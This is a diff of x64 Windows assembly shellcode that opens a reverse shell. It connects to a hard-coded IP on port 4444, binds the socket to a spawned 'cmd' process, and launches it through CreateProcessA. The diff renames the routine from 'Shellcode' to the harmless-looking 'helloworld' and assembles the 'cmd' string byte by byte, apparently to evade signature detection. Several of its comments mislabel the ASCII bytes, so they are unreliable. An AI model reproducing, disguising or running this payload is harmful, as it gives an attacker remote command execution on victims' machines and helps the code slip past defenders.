@@ -1,6 +1,6 @@
 .code
 
-Shellcode PROC
+helloworld PROC
 	start:
 		sub rsp, 1000h
 		mov r15, rsp					; copy stack pointer to r15 register
@@ -155,7 +155,7 @@ Shellcode PROC
 		mov rcx, rax					; pointer to the socket
 		mov r8, 10h						; namelen argument = 10
 		lea rdx, [r15 + 300h]			; pointer to sockaddr_in
-		mov r9, 811aa8c05c11h			; sin_addr + sin_port (4444)
+		mov r9, 0a64a8c05c11h			; sin_addr + sin_port (4444)
 		mov [rdx + 2], r9				; write above to stack
 		xor r9,r9						;
 		inc r9d							;
@@ -183,10 +183,15 @@ Shellcode PROC
 		mov [rbx + 60h], rsi			; lpStartupInfo.hStdError = socket handle
 
 	call_createprocessa:
-		xor ecx, ecx					; lpApplicationName
+		xor rcx, rcx					; lpApplicationName
 		mov rdx, r15					; lpCommandLine
-		sub rdx, 0FFFFF8FFh				; add rdx, 700h
-		mov eax, 646d63h				; "cmd"
+		add rdx, 600h					; add rdx, 600h
+		xor eax, eax					; "cmd" => 646d63h
+		mov al, 64h						; Load 'c' (ASCII 0x63) into AL (lowest byte of EAX)
+		shl eax, 8						; Shift EAX left by 8 bits (move 'c' to the next byte
+		add al, 6dh						; Add 'm' (ASCII 0x6D) to AL, now EAX = 0x006D63
+		shl eax, 8						; Shift EAX left by 8 bits (move 'm' and 'c')
+		add al, 63h						; Add 'd' (ASCII 0x64) to AL, now EAX = 0x646D63
 		mov [rdx], rax
 		xor r8, r8						; lpProcessAttributes
 		xor r9, r9						; lpThreadAttributes
@@ -210,6 +215,6 @@ Shellcode PROC
 		mov rax, [r15 + 90h]
 		call rax
 
-SHELLCODE ENDP
+helloworld ENDP
 
 END
